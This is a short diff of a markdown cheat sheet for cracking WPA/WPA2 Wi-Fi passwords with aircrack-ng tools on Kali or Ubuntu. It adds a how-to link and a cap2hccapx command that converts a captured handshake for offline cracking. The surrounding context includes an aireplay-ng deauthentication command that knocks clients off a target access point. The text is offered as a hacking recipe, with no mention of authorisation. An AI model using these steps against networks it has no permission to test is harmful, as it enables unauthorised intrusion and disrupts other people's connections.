@@ -2,6 +2,10 @@
 ## macos
 https://martinsjean256.wordpress.com/2018/02/12/hacking-aircrack-ng-on-mac-cracking-wi-fi-without-kali-in-parallels/
 ## kali or ubuntu
+
+https://www.wikihow.com/Hack-WPA/WPA2-Wi-Fi-with-Kali-Linux
+
+
 hack wifi (wpa2-wpa) with kali or ubuntu
 #### new terminal 1
 You can change your mac address(Optional)
@@ -27,6 +31,13 @@ attack to get handshake in terminal 2
 ```
 aireplay-ng -0 <60> -a <BSSID> wlan0mon
 ```
+
+##########
+```
+cap2hccapx.bin name.cap name.hccapx
+
+```
+
 #### final step
 after You get handshake in (2)
 
